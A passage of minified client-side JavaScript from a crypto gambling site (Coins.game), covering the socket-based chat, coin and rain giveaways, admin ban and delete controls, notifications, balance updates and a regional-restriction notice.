v4OHy8/T19vf4+fr7/P3+//DzCgwIEECxo8iDChwoUMGzp05+Nhgi2fCgAAIfkECQcAAQAsFgAFANAASwAAAtWMj6nL7Q+jnLTa64DeGvsPhuJIQhxXpurKttW5ufJM1xjc2frO13gPDApBv6HxiFQUk8ym8wmNSqfUqvWKzWq33K73Cw6Lx+Sy+YxOq9fstvsNj8vn9Lr9js/r9/y+/w8YKDhIyCZQiCegiFin6HjIGPfoGCk5uVj5dgmZ2bbJ2bm2Gep5SVqKeWoIqtrq+gobKztLW2t7i5uru8vb6/sLHCw8TFxsfIycrLzM3Oz8DB0tnTkwMD1UXX0NlJ29vdPt/V0Trj1OU259jh6+btPtDh5fUwAAIfkECQcAAQAsGgANAMkAUAAAAtmMj6nL7Q+jnLTamwDevPsPhg9AkuKJpuoalS4Lx/IsuSWN53pq3/sPDNZ6GqHxaCQil8ydrQmNykzSqvWKzWq33K73Cw6Lx+Sy+YxOq9fstvsNj8vn9Lr9js/r9/y+/w8YKDhIWGh4iJiouMjY6PgIGSmZJVBpOYlmeYlpplnJWeb5CTomKkBaKooqZroa1ur6qhlLW2t7i5uru8vb6/sLHCw8TFxsfIycrLzM3Oz8DB0tPU1dbX2dPIC9MtDdvR3iLf4N/jEuXm5+7p3esU7ezoEeD6JNH1IAACH5BAkHAAEALB4AFgDDAFIAAALajI+py+0Po5y02guu3rz7D0bAGJbmiabSyKruC8cr28r2jZf0nvf+D9nRgMQiUJgxKpcyIfMJRQ2j1GqHZM1qt9yu9wsOi8fksvmMTqvX7Lb7DY/L5/S6/Y7P6/f8vv8PGCg4SFhoeIiYqLjI2Oj4CBkpOUlZaXn5I4BZJtCpuRnm6QnqJSpKumU6iqql2sma5foJWyVLG2t6m/qqyzXbCxwsPExcbHyMnKy8zNzs/AwdLT1NXW19jZ2tvc3d7f0NHk46QC7+QY4+YK6R3q6+PuGeDh8v/04fUQAAIfkECQMAAQAskgAgAE0ANAAAAmeMj6nL7b8AgLTae6TGvF8NeuIYgRKJkuaWttw6uXIFz/az3npz7v4PDAqHxKLxiEwql8ym8wmNSqfUqvWKzWq33K73Cw6Lx+Sy+YxOnwVrAXvsjovj9Le3Xv/i6fq9/Y4HJ0c2KFYAACH5BAkHAAEALJcAKgBHADYAAAJijI+py+0N4pu02hOzvLxPnXniiIAbiXImkLbW6sbOysq2Yt76zvf+DwwKh8Si8YhMKpfMpvMJjUqn1Kr1is1qt9yu9wsOi8fksvmMTlsF7Cz7DXfD49g5/Wp/y/N7u1bfVQAAIfkECQcAAQAsnAAzAEMANQAAAlyMj6nL7QqenLSCG6veFF8OhojniaZFYuf6pB8LL24W10dq5+Or9wHtCwqHxKLxiEwql8ym8wmNSqfUqvWKzWq33K73Cw6Lx+Sy+YxOq9fsNlcQFsjh7/l8a89nCwAh+QQJAwABACzXAD0ACQAJAAACD4wDcJfJ7RBsctpZ4Yt7FQAh+QQJBwABACzZAEcACAAIAAACDIwNEMntD916U8pQAAAh+QQJBwABACzcAFAACAAJAAACDQwQqcfLD6OczzWVTigAIfkECQMAAQAs3gBZAAoACgAAAhOMA3CbudiciRHSZu/Uhz77TUsBACH5BAkHAAEALOMAYgAIAAYAAAILjANwmMqdHpSwtgIAIfkEBQMAAAAsAAAAAAEAAQAAAgJEAQA7"\n                                class="delay">\n                                <span class="c_d_amount13">${n}</span>\n                                <span>${s}</span></div>\n                          </div>\n                        </div>\n                      </div>\n                    </div>\n                  </div>\n                </div>\n              </div>\n            </div>\n          </div>\n        </div>\n      </div>\n  </div>`;
        h.setAttribute("id", `cGmMD${e.id}`), h.classList.add(`cGmId${e.userChatId}`), h.classList.add("cGmsg11"), h.innerHTML = g, f.appendChild(h)
    };
if (window.closeHowUse = () => {
        document.getElementsByClassName("how_use")[0].classList.remove("active"), document.getElementById("informChat11").classList.remove("active"), errUnFixBet()
    }, window.closeSendBetChat = () => {
        document.getElementsByClassName("send_bet_chat")[0].classList.remove("active"), errUnFixBet()
    }, window.closeSendDropChat = () => {
        document.getElementsByClassName("send_drop_chat")[0].classList.remove("active"), errUnFixBet()
    }, window.innerWidth > 450) {
    let e = 0,
        t = document.getElementById("chat_game11");
    t.addEventListener("mouseover", (() => {
        let t = document.getElementsByTagName("body")[0];
        0 != window.pageYOffset && (e = window.pageYOffset), t && (t.style.top = "-" + e + "px"), t && (t.style.overflow = "hidden"), t && (t.style.position = "fixed"), t && (t.style.height = "max-content"), t && (t.style.width = "100%"), t && (t.style.overflowY = "scroll"), t = document.getElementsByClassName("chatGameWr769")[0], t && (t.style.right = "4px")
    })), t.addEventListener("mouseleave", (() => {
        let t = document.getElementsByTagName("body")[0];
        t && (t.style.overflow = ""), t && (t.style.position = ""), t && (t.style.height = ""), t && (t.style.width = ""), t && (t.style.top = ""), t && (t.style.overflowY = ""), t = document.getElementsByClassName("chatGameWr769")[0], t && (t.style.right = ""), window.scrollTo(0, e), e = 0
    }))
}
window.openSendBetChat = (e, t, s, a, n, r) => {
    document.getElementById("c_d_id11").innerHTML = e, document.getElementById("c_d_kef11").innerHTML = t;
    let o = gameName.charAt(0).toUpperCase() + gameName.slice(1),
        i = document.getElementsByClassName("betInfoGame77")[0];
    i.setAttribute("src", `/assets/svgGame/${o}.svg?x=7`), i.setAttribute("alt", o), document.getElementById("c_d_amount11").innerHTML = s, document.getElementById("c_d_cur11").innerHTML = a, document.getElementById("c_d_image11").setAttribute("src", `${hrefReqGameAll.split("/apps/")[0]}/apps/currency/${a}.svg`), document.getElementById("c_d_blockMoney11").classList.remove("win"), document.getElementById("c_d_blockMoney11").classList.remove("lose"), document.getElementById("c_d_blockKef11").classList.remove("win"), document.getElementById("c_d_blockKef11").classList.remove("lose"), document.getElementById("c_d_imageStatus11").classList.remove("win"), document.getElementById("c_d_imageStatus11").classList.remove("lose");
    let l = "win";
    document.getElementById("c_d_textBet11").innerHTML = chatLanguage[lngG1]["Brilliant win!"], "0.00x" == t || s != n ? (l = "lose", document.getElementById("c_d_textBet11").innerHTML = chatLanguage[lngG1]["Lose is nothing!"], document.getElementById("c_d_inp11").placeholder = chatLanguage[lngG1]["Lose is nothing!"]) : document.getElementById("c_d_inp11").placeholder = chatLanguage[lngG1]["I'm in luck Today!"], document.getElementById("timed5666").innerHTML = r, document.getElementById("c_d_imageStatus11").classList.add(l), document.getElementById("c_d_blockKef11").classList.add(l), document.getElementById("c_d_blockMoney11").classList.add(l), document.getElementsByClassName("send_bet_chat")[0].classList.add("active"), errFixBet()
};
let statusChatDrop = "",
    chatRoomN = localStorage.getItem("chatRoomN");
null != chatRoomN && null != chatRoomN && "" != chatRoomN && NaN != chatRoomN || (chatRoomN = "global"), window.openSendDropChat = e => {
    if (1 != window.user_il) return void openMobileLogin();
    errFixBet();
    let t = document.getElementsByClassName("send_drop_chat")[0];
    t.classList.add("active");
    let s = t.getElementsByClassName("send_drop_title")[0],
        a = t.getElementsByClassName("coins_dropText")[0],
        n = t.getElementsByClassName("rain_dropText")[0],
        r = t.getElementsByClassName("button-inner")[0],
        o = t.getElementsByClassName("show-amount")[0],
        i = document.getElementById("drop_amount_co1"),
        l = document.getElementById("drop_coin_co"),
        c = document.getElementById("chat_cur_am2"),
        d = document.getElementById("coin_cur103");
    curDrop = userBetCur, "CANDY" == curDrop && (curDrop = "USDT");
    let u = Number(listCurs.data.rates[curDrop]) * Number(.1);
    u = Number(u).toFixed(8), i.value = u, l.innerHTML = u, c.innerHTML = u + " " + curDrop, d = curDrop, coinsDropVal = u, checkBtnDrop(), openDropCur(document.getElementsByClassName("dep_trigger6")[0], 6), cabChooseCur(curDrop, 6), 1 == e ? (statusChatDrop = "coin", s.innerHTML = "Coin Drop", r.innerHTML = "Start CoinDrop", n.style.display = "none", a.style.display = "flex", o.style.display = "flex") : (a.style.display = "none", n.style.display = "flex", statusChatDrop = "rain", s.innerHTML = "Rain Drop", o.style.display = "none", r.innerHTML = "Start RainDrop")
};
let curDrop, setDropCoi7 = e => {
        e = e.innerHTML.split(" ")[0], document.getElementById("drop_amount_co1").value = e, coinsDropVal = e, checkBtnDrop()
    },
    checkBtnDrop = e => {
        let t = Number(coinsDropVal) / Number(coinsDropCount),
            s = document.getElementById("drop_co_btn7"),
            a = Number(listCurs.data.rates[curDrop]) * Number(.1);
        a = window.truncatorJet(a, 8);
        let n = a * Number(coinsDropCount);
        return n = Number(n).toFixed(8), document.getElementById("chat_cur_am2").innerHTML = n + " " + curDrop, t >= Number(a) && "Infinity" != String(t) && "NaN" != String(t) && 2 != e ? (s.disabled = !1, !0) : (s.disabled = !0, !1)
    },
    coinsDropVal = 0,
    coinsDropCount = 50;
window.changeCoinDropVal = e => {
    document.getElementById("drop_coin_co").innerHTML = e, coinsDropVal = Number(e), checkBtnDrop()
}, window.countTextDropChat = e => {
    let t = document.getElementById("drop_coin_ta");
    t.innerHTML = e.length, t = t.parentNode, Number(e.length) > 32 ? t.classList.contains("active") || t.classList.add("active") : t.classList.contains("active") && t.classList.remove("active")
}, window.countPlaDropChat = e => {
    let t = document.getElementById("minNDrop25");
    coinsDropCount = Number(e), m = 1, Number(e) < 5 || Number(e) > 100 || !Number.isInteger(Number(e)) ? (t.classList.contains("active") || t.classList.add("active"), m = 2) : t.classList.contains("active") && t.classList.remove("active"), checkBtnDrop(m)
}, window.sendInChat = () => {
    if (1 != activateEmail) return void createNotifyL(1, "Verify Email", lp.Error);
    let e = document.getElementById("c_d_inp11"),
        t = document.getElementById("c_d_id11").innerHTML;
    if (1 == statusChatGame) {
        let s = chTMes78(e.value);
        openChat((() => {
            socketChatJG.emit("betInfo", gameName, t, s)
        }))
    } else socketChatJG.emit("betInfo", gameName, t, chTMes78(e.value));
    e.value = "", closeSendBetChat()
}, window.closeBtnClose = () => {
    let e = document.getElementsByClassName("admin_close117");
    Array.from(e).forEach((e => {
        e.classList.contains("active") && openbanUserChat(e)
    })), window.removeEventListener("click", closeBtnClose)
}, window.openbanUserChat = (e, t, s) => {
    if (e.classList.contains("active")) e.classList.remove("active"), e.getElementsByClassName("ch_l_ch")[0].outerHTML = "";
    else {
        let a = e.dataset.n;
        closeBtnClose(), e.classList.add("active");
        let n = "";
        [.5, 1, 3, 24, 168, 720, 1e5].forEach((e => {
            n += `<div onclick="banUserChat('${t}','${e}',this,'${s}')" data-n="${a}" class='ch_l_ch_it'>${e}</div>`
        })), n += `<div onclick="banUserMes('${s}',this,1)" data-n="${a}" class='ch_l_ch_it'>Delete</div>`, n += `<div onclick="banUserMes('${s}',this,2)" data-n="${a}" class='ch_l_ch_it'>Delete All</div>`, setTimeout((() => {
            window.addEventListener("click", closeBtnClose)
        }), 0), e.innerHTML += `\n      <div class='ch_l_ch'>\n      ${n}\n      </div>\n      `
    }
}, window.banUserMes = (e, t, s) => {
    let a = t.dataset.n;
    Swal.fire({
        title: lp["Are you sure?"],
        text: 1 == s ? "Delete message from " + a : "Delete all messages from " + a,
        icon: "question",
        showCancelButton: !0,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        cancelButtonText: lp.No,
        confirmButtonText: lp.Yes
    }).then((a => {
        a.isConfirmed && (1 == s && socketChatJG.emit("deleteMessage", e), 2 == s && socketChatJG.emit("deleteMessageAll", e), openbanUserChat(t.parentNode))
    }))
}, window.banUserChat = (e, t, s, a) => {
    let n = s.dataset.n;
    Swal.fire({
        title: lp["Are you sure?"],
        text: "Ban user " + n + " on " + t + " hours",
        icon: "question",
        showCancelButton: !0,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        cancelButtonText: lp.No,
        confirmButtonText: lp.Yes
    }).then((n => {
        if (n.isConfirmed) {
            let n = {
                type: "ban",
                id: a,
                term: t,
                criminalId: e
            };
            socketChatJG.emit("admin", n), openbanUserChat(s.parentNode)
        }
    }))
}, window.openChatEmo = e => {
    let t = document.getElementsByClassName("emoji-box-wrap")[0];
    1 != e ? t.classList.contains("active") ? (t.classList.remove("active"), window.removeEventListener("click", openChatEmo)) : (t.classList.add("active"), setTimeout((() => {
        window.addEventListener("click", openChatEmo)
    }), 0)) : (t.classList.remove("active"), window.removeEventListener("click", openChatEmo))
}, window.openChatGif = e => {
    let t = document.getElementsByClassName("gif-box-wrap")[0];
    t && (1 != e ? t.classList.contains("active") ? (t.classList.remove("active"), window.removeEventListener("click", openChatGif)) : (t.classList.add("active"), setTimeout((() => {
        window.addEventListener("click", openChatGif)
    }), 0)) : (t.classList.remove("active"), window.removeEventListener("click", openChatGif)))
}, window.focusChatEmoInp = e => {
    e.preventDefault(), e.stopPropagation()
};
let prCP55 = 0;

function getCookieChat(e) {
    var t = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
    return t ? decodeURIComponent(t[1]) : void 0
}
window.pastChatEmo = e => {
    ((e, t) => {
        let s = document.getElementById("text_u_chatG"),
            a = s.scrollTop,
            n = s.selectionStart;
        isNaN(n) && (n = prCP55), prCP55 = n;
        let r = s.value.substring(0, n),
            o = s.value.substring(s.selectionEnd, s.value.length);
        s.value = r + t + o, n += t.length, s.selectionStart = n, s.selectionEnd = n, s.click(), s.scrollTop = a
    })(0, e.currentTarget.innerHTML)
}, window.openHowUse = async () => {
    let e = await axios.get("/assets/chat/index_rules_" + lngG1 + ".html?x=1690").catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        })),
        t = document.getElementsByClassName("how_use")[0];
    t.classList.add("active"), t = document.getElementsByClassName("how_use_content_inner")[0], t.innerHTML = "", t.innerHTML = e.data, document.getElementById("informChat11").classList.add("active"), errFixBet()
};
let scrollChatPrev = 0,
    scrollChatBottom = e => {
        let t = document.getElementById("chat_game11"),
            s = document.getElementById("chat_block11"),
            a = document.getElementById("text_u_chatG");
        document.activeElement != a && (1 == e ? (t.scrollTop = t.scrollHeight, scrollChatPrev = t.scrollHeight) : (Number(t.scrollTop + s.offsetHeight) > Number(scrollChatPrev - 170) && (t.scrollTop = t.scrollHeight), scrollChatPrev = t.scrollHeight))
    },
    timeAvatarsC = Date.now(),
    controlAvatar = (e, t, s) => {
        let a = document.getElementById("chat_game11");
        a = a.getElementsByClassName(`cGmId${e}`), Array.from(a).forEach((e => {
            let a = e.getElementsByClassName("avatar")[0],
                n = `/assets/chat/img/avatar${t}.svg?x=10`;
            a.setAttribute("src", n), 0 == t && (a.onerror = e => {
                e.currentTarget.setAttribute("src", n)
            }, timeAvatarsC = Date.now(), a.setAttribute("src", `/user_thumb/a_${s}.jpg?x=${timeAvatarsC}`))
        }))
    };
window.avSrcT = (e, t, s) => {
    let a = `/assets/chat/img/avatar${e}.svg?x=10`,
        n = timeAvatars;
    return 2 && (n = timeAvatarsC), a = 0 == e && t ? `onerror="this.setAttribute('src','${a}')" src="/user_thumb/a_${t}.jpg?x=${n}"` : 'src="' + a + '"', a
};
let isAdmin, servScCH = () => {
        let e = document.getElementById("chat_game11");
        e.offsetHeight + e.scrollTop > e.scrollHeight - 100 && showSkip5(2)
    },
    skip5show = 0,
    showSkip5 = (e, t) => {
        let s = document.getElementsByClassName("chat_sctip")[0],
            a = document.getElementById("chat_game11");
        1 == e && (countMesChat += 1, skip5show = 1, 1 != countMesChat || isMobile() || createLineMSG(1, t), changeCountNot(5), s.style.display = "block", a.addEventListener("scroll", servScCH)), 2 == e && (a.removeEventListener("scroll", servScCH), countMesChat = 0, skip5show = 0, changeCountNot(5), scrollChatBottom(1), s.style.display = "none")
    },
    visMSG = function(e) {
        let t = window.pageYOffset + e.getBoundingClientRect().top,
            s = window.pageYOffset + e.getBoundingClientRect().bottom,
            a = window.pageYOffset,
            n = window.pageYOffset + document.documentElement.clientHeight;
        return !(s > a && t < n)
    },
    createScriptChat = () => {
        setTransChat(), "undefined" != typeof socketChatJG && null != socketChatJG && socketChatJG.disconnect(), "undefined" != typeof socketChatJG && (socketChatJG = null), window.socketChatJG = io(urlSocketGame, {
            reconnectionDelayMax: 5e3,
            path: pathSocketChatG,
            transports: ["websocket"],
            auth: {
                key: publicChatGame,
                uid: userIDGame,
                hash: userHASHGame,
                room: chatRoomN
            }
        });
        let e = document.getElementsByClassName("chatGameWr769")[0];
        2 == statusChatGame && "2" == e.dataset.status && (e.dataset.status = "1", useCont(document.getElementById("chat_control11")), openChat()), socketChatJG.on("reconnect", (() => {
            t()
        })), socketChatJG.on("connect", (() => {
            t()
        })), socketChatJG.on("disconnect", (() => {
            boxTimeIn && clearInterval(boxTimeIn)
        })), socketChatJG.on("chatRooms", (() => {
            socketChatJG.emit("connectToChat", userIDGame, publicChatGame, userHASHGame, (e => {
                userChatUID = e.userChatId, isAdmin = e.isAdmin
            }))
        }));
        let t = () => {
            socketChatJG.emit("connectToChat", userIDGame, publicChatGame, userHASHGame, (e => {
                userChatUID = e.userChatId, isAdmin = e.isAdmin
            })), socketChatJG.emit("openRoom", chatRoomN), boxTimeIn && getInfoUserBoxes()
        };
        socketChatJG.on("message", (e => {
            if (1 != statusChatGame || (countMesChat += 1, changeCountNot(1), stO789 && !(countMesChat > 50))) {
                if ("text" != e.type && "gif" != e.type && "quote" != e.type && "randomRain" != e.type && "clickRain" != e.type || createMsgChat(e), "betInfo" == e.type && createBetChat(e), "finishRain" == e.type) {
                    let t = document.getElementById("btnCoinRain" + e.rainId);
                    t && (t.disabled = !0), createMsgChat(e)
                }
                setTimeout((() => {
                    e.userChatId == userChatUID ? scrollChatBottom(1) : scrollChatBottom(0), 2 == statusChatGame && visMSG(document.getElementById("cGmMD" + e.id)) && showSkip5(1, "cGmMD" + e.id)
                }), 0)
            }
        })), socketChatJG.on("error", (e => {
            createNotifyL(1, e.text + ", try again", lp.Error), 1 == user_in && socketChatJG.emit("connectToChat", userIDGame, publicChatGame, userHASHGame, (e => {
                userChatUID = e.userChatId
            }))
        })), socketChatJG.on("messageDeleted", (e => {
            let t = document.getElementById(`cGmMD${e.id}`);
            t && (t.outerHTML = "")
        })), socketChatJG.on("messageDeletedAll", (e => {
            let t;
            Array.from(e).forEach((e => {
                t = document.getElementById(`cGmMD${e}`), t && (t.outerHTML = "")
            }))
        })), socketChatJG.on("changeAvatar", ((e, t, s) => {
            controlAvatar(e, t, s)
        }));
        let s = (e, t) => {
            e = e.reverse(), document.getElementsByClassName(t)[0].innerHTML = "", e.slice(0, 10).reverse().forEach((e => {
                e.currency && createHistoryMain(t, e.time, e.name, window.truncatorJet(e.bet, 8), e.currency, Number(e.multiplier).toFixed(2), window.truncatorJet(e.payout, 8), e.game)
            }))
        };
        socketChatJG.on("lastNotifyList", (e => {
            s(e, "table_lattest_bets")
        })), socketChatJG.on("lastNotifyListVIP", (e => {
            s(e, "table_highwin_bets")
        }));
        let a = (e, t) => {
            e.forEach((e => {
                let s = document.getElementsByClassName(t)[0];
                s = s.getElementsByTagName("tr"), s.length > 9 && s[s.length - 1] && (s[s.length - 1].outerHTML = ""), e.currency && Number(e.payout) > 0 && ("plinko" == e.game ? setTimeout((() => {
                    updateGame77(e.game, e.payout, e.currency)
                }), 7e3) : updateGame77(e.game, e.payout, e.currency)), createHistoryMain(t, e.time, e.name, window.truncatorJet(Number(e.bet), betListCur[e.currency].precision), e.currency, Number(e.multiplier).toFixed(2), window.truncatorJet(Number(e.payout), betListCur[e.currency].precision), e.game)
            }))
        };
        socketChatJG.on("notify", (e => {
            a([e], "table_lattest_bets")
        })), socketChatJG.on("vip_notify", (e => {
            a(e, "table_highwin_bets")
        })), socketChatJG.on("updateData", (e => {
            if ("amount" == (e = JSON.parse(e)).type) {
                if (null != e.amount.JETblock) {
                    JETblock = e.amount.JETblock;
                    let t = document.getElementsByClassName("b_j_block");
                    Array.from(t).forEach((e => e.innerHTML = window.truncatorJet(JETblock, 8) + "&#128274;"))
                }
                delete e.amount.JETblock;
                let t = Object.entries(e.amount);
                upMoneyCoins(t), 1 == stBal0 && (getCurs0(2), getCurs0(1)), 1 == stBalUsd && (getUSD(2), getUSD(1)), 1 == e.deposite && 0 == userCDep && 1 == fbon0 && (fbon0 = 0, closeFirstBon(), set4DepB())
            }
            if ("levelup" == e.type) {
                userLevel = e.level, setUserLvl({
                    userLevel: e.level,
                    userLevelProc: e.progress
                });
                let t = Object.entries(e.amount);
                upMoneyCoins(t), 1 == stBal0 && (getCurs0(2), getCurs0(1)), 1 == stBalUsd && (getUSD(2), getUSD(1))
            }
            if ("progressup" == e.type) {
                setUserLvl({
                    userLevel: userLevel,
                    userLevelProc: e.progress
                })
            }
            if ("mes" == e.type && createNotifyL(e.typeN, e.text, e.title, e.img, e.time), "exit" == e.type && exitUser(), "noverif" == e.type) {
                let e = document.getElementById("btn_verif");
                e && (e.style.display = "none")
            }
            "cardpay" == e.type && openUahSt(e), "notify" == e.type && (createNotifyMes(e, 3), "s" != e.tab ? (countMesP += 1, changeCountNot(3)) : (countMesS += 1, changeCountNot(4)), countMesNot = countMesP + countMesS, changeCountNot(2))
        }))
    },
    addClassNot = (e, t, s) => {
        let a = document.getElementsByClassName("" + ("s" != e ? "notify_system117_1" : "notify_system117_0"))[0];
        a = a.getElementsByClassName("sswsdjr"), 2 == t && Array.from(a).forEach(((e, t) => {
            t + 1 < s && e.classList.add("active")
        })), 3 == t && Array.from(a).forEach(((e, t) => {
            e.classList.remove("active")
        }))
    },
    createNotifyMes = (e, t) => {
        null == e.imgUrl && (e.imgUrl = ""), null == e.linkUrl && (e.linkUrl = ""), null == e.linkTitle && (e.linkTitle = ""), null == e.linkText && (e.linkText = "");
        let s = getTimeDots(e.timeData),
            a = "";
        "" != e.linkUrl && (a = `<div class="p link-box">\n    <div class="flex">\n        <div class="tip">\n            <span class="finger">${e.linkTitle}</span>\n        </div>\n    </div>\n    <div><a href="${e.linkUrl}" class="hover notif_urlText118" >${e.linkText}</a></div>\n</div>`);
        let n = "";
        "s" != e.tab && (n = "welcome");
        let r = "";
        "" != e.imgUrl && (r = `<img loading="lazy" src="${e.imgUrl}" class="avatar">`);
        let o = `<div class="sswsdjr ${3==t?"active":""}">\n  <div class="item-head">\n      <div class="title">${e.title}</div>\n      <div class="base flex-center">\n          <div class="user flex-center">\n          ${r}\n          <div>${e.from}\n          <div class="time notif_time118">${s}</div></div>\n          </div>\n      </div>\n  </div>\n  <div class="item-content">\n      <div class="notif_text118 ${n}"> ${e.text}\n      </div>\n      ${a}\n    </div>\n  </div>`,
            i = document.getElementsByClassName("" + ("s" != e.tab ? "notify_system117_1" : "notify_system117_0"))[0];
        0 == i.dataset.status ? (i.dataset.status = 1, i.innerHTML = o) : 2 == t ? i.innerHTML += o : i.innerHTML = o + i.innerHTML
    };
window.upMoneyCoins = e => {
    let t = arrayCurrency.concat(arrayCurrencyFiat);
    arrayCurrencyFiat.forEach((t => {
        e.forEach((e => {
            t[0] == e[0] && (t[1] = e[1])
        }))
    })), arrayCurrency.forEach((t => {
        e.forEach((e => {
            t[0] == e[0] && (t[1] = e[1])
        }))
    })), t.forEach((t => {
        e.forEach((e => {
            if (t[0] == e[0]) {
                let s = document.getElementsByClassName("b117_" + e[0]),
                    a = e[1];
                if (1 == stBalUsd && (a = (Number(t[1]) / Number(listCurs.data.rates[t[0]])).toFixed(9)), a = window.truncatorCoins(a, betListCur[e[0]].precision), 1 == stBalUsd) {
                    a += " $";
                    let t = arrayUsd.findIndex((t => t[0] == e[0])); - 1 != t && (arrayUsd[t][1] = a)
                }
                if (Array.from(s).forEach((e => e.innerHTML = a)), userBetCur == e[0]) {
                    let e = document.getElementsByClassName("user-money05");
                    Array.from(e).forEach((e => e.innerHTML = a))
                }
            }
        }))
    }))
};
let countMesChat = 0,
    countMesNot = 0,
    countMesP = 0,
    countMesS = 0,
    createLineMSG = (e, t = !1) => {
        let s = document.getElementById("nmch78");
        if (1 == e) {
            s && (s.outerHTML = "");
            let e = '<div id="nmch78"><div></div><div>New messages</div><div></div></div>',
                a = document.createElement("div");
            a.innerHTML = e, s = document.getElementById("chat_game11"), s && !t ? s.appendChild(a) : (s = document.getElementById(t), s && (s.outerHTML = e + s.outerHTML))
        }
        2 == e && s && (s.outerHTML = "")
    },
    changeCountNot = e => {
        let t;
        1 != e && 5 != e || (t = document.getElementsByClassName("chat_count118"), Array.from(t).forEach((t => {
            1 == e && (t.style.display = 0 != countMesChat && 2 != statusChatGame ? "flex" : "none"), t.innerHTML = countMesChat
        })), t = document.getElementById("chvic5"), t.innerHTML = countMesChat, 1 == countMesChat && 1 == e && createLineMSG(1)), 2 == e && (t = document.getElementsByClassName("notif_count117"), Array.from(t).forEach((e => {
            e.style.display = 0 != countMesNot ? "flex" : "none", e.innerHTML = countMesNot
        })), t = document.getElementById("notif_count118"), window.innerWidth < 1025 ? (t.style.display = 0 != countMesNot ? "flex" : "none", t.innerHTML = countMesNot) : t.style.display = "none"), 3 == e && (t = document.getElementById("notif_per117"), t.style.display = 0 != countMesP ? "flex" : "none", t.innerHTML = countMesP), 4 == e && (t = document.getElementById("notif_sys117"), t.style.display = 0 != countMesS ? "flex" : "none", t.innerHTML = countMesS)
    },
    userChatUID = "",
    stO789 = 0,
    createChatWeb = (e, t, s = !1) => {
        let a = document.getElementById("chat_game11"),
            n = document.getElementById("text_u_chatG");
        n.disabled = !0, socketChatJG.emit("openRoom", e, (e => {
            stO789 = 1, s || (a.innerHTML = ""), e.forEach((e => {
                if (!s || !document.getElementById(`cGmMD${e.id}`)) {
                    if ("text" == e.type || "gif" == e.type || "quote" == e.type || "randomRain" == e.type || "clickRain" == e.type || "finishRain" == e.type) {
                        if ("finishRain" == e.type) {
                            let t = document.getElementById("btnCoinRain" + e.rainId);
                            t && (t.disabled = !0)
                        }
                        createMsgChat(e)
                    }
                    "betInfo" == e.type && createBetChat(e)
                }
            })), t && t(), setTimeout((() => {
                scrollChatBottom(1), n.disabled = !1
            }), 0)
        }))
    };
const countryLngs = {
    DE: "de",
    AT: "de",
    CH: "de",
    LI: "de",
    LU: "de",
    FR: "fr",
    ES: "es",
    AR: "es",
    BO: "es",
    CO: "es",
    CL: "es",
    CR: "es",
    DO: "es",
    EC: "es",
    GT: "es",
    HN: "es",
    MX: "es",
    NI: "es",
    PA: "es",
    PE: "es",
    PR: "es",
    PY: "es",
    SV: "es",
    UY: "es",
    VE: "es",
    IN: "hi",
    ID: "id",
    JP: "ja",
    KR: "ko",
    CN: "zh",
    HK: "zh",
    MO: "zh",
    SG: "zh",
    TW: "zh",
    PT: "pt",
    BR: "pt",
    RU: "ru",
    AZ: "az",
    UA: "ua",
    IR: "fa",
    IQ: "fa",
    BH: "fa",
    KW: "fa",
    TR: "tr",
    PL: "pl",
    FI: "fi"
};
let checkUser = async () => {
    if (user_in = window.user_il, "1" == window.user_il) document.getElementsByTagName("body")[0].classList.add("user_site"), await setUserInfo(), RecGs = JSON.parse(localStorage.getItem("RecGs" + userIDGame)), null != RecGs && null != RecGs || (RecGs = []), favGs = JSON.parse(localStorage.getItem("favGs" + userIDGame)), null != favGs && null != favGs || (favGs = []), 1 == getCookie("entry99") && openExtraReg();
    else {
        document.getElementsByTagName("body")[0].classList.remove("user_site");
        let e = getCookieChat("lng");
        null == e && countryLngs[userCountry] && (e = countryLngs[userCountry]), lngGame = e, e || (e = "en"), changeLanguage(e), createScriptChat()
    }
    if (setOffUser(), -1 != ["FR", "CW", "AW", "BQ", "SX"].findIndex((e => e == userCountry))) {
        let e = {
            FR: "France",
            CW: "Dutch Caribbean Islands",
            AW: "Dutch Caribbean Islands",
            BQ: "Dutch Caribbean Islands",
            SX: "Dutch Caribbean Islands"
        } [userCountry];
        Swal.fire({
            title: "Sorry, Coins.game isn't available in your region",
            icon: "error",
            html: `<span style="position: absolute; right:0;top:0" onclick="swal.clickConfirm();" class="modal_close"><div class="modal_btn-close"><i class="modal_icon"></i></div></span>\n            <p style='color: #9DB8E1;'>Due to our gaming license, we cannot accept players from ${e}. Contact us via support@coins.game if you require further assistance.</p>\n            `,
            iconHtml: '<img style="border:0" src="/assets/coins_mob2.svg?x=2" width="60" height="27">',
            showCancelButton: !1,
            showConfirmButton: !1
        })
    }
}, modalOpen = 0, closeUrl = () => {
    modalOpen && null != previousUrlGame && (-1 != previousUrlGame.indexOf("&signup") && closeSign(), -1 != previousUrlGame.indexOf("&transactions") && closeTrans(), -1 != previousUrlGame.indexOf("&profile") && closeProfile(), -1 != previousUrlGame.indexOf("&deposite") && closeDeposite(), -1 != previousUrlGame.indexOf("&rakeback") && closeRakeback(), -1 != previousUrlGame.indexOf("&statistics") && closeStatic(), -1 != previousUrlGame.indexOf("&sportbets") && closeSportBets(), -1 != previousUrlGame.indexOf("&bonus") && closeBonus(), -1 != previousUrlGame.indexOf("&settings") && closeTasks(), -1 != previousUrlGame.indexOf("&tasks") && closeSettings(), -1 != previousUrlGame.indexOf("&verify_representative") && closeVerRep(), -1 != previousUrlGame.indexOf("&getPrize") && closeGetPrize(), -1 != previousUrlGame.indexOf("&bonusWheel") && closeWheel(), -1 != previousUrlGame.indexOf("&help-center") && closeHelp(), -1 != previousUrlGame.indexOf("&signin") && closeMobileLogin(), -1 != previousUrlGame.indexOf("&sign2FA") && closeMobileLogin(), -1 != previousUrlGame.indexOf("&payment") && closePayment(), -1 != previousUrlGame.indexOf("&rules") && closeRoules(), modalOpen = 0)
}, checkPage = () => {
    closeUrl();
    let e = 1;
    if (e && -1 != window.location.href.indexOf("?slots") && !modalOpen && (modalOpen = 0, e = 0, openSlots()), e && -1 != window.location.href.indexOf("?provider") && !modalOpen) {
        modalOpen = 0, e = 0;
        let t = window.location.href.split("?provider=")[1];
        t && (t = decodeURI(t.split("&")[0].split("#")[0])), openSlots(t, 1)
    }
    if (e && -1 != window.location.href.indexOf("?category") && !modalOpen) {
        modalOpen = 0, e = 0;
        let t = window.location.href.split("?category=")[1];
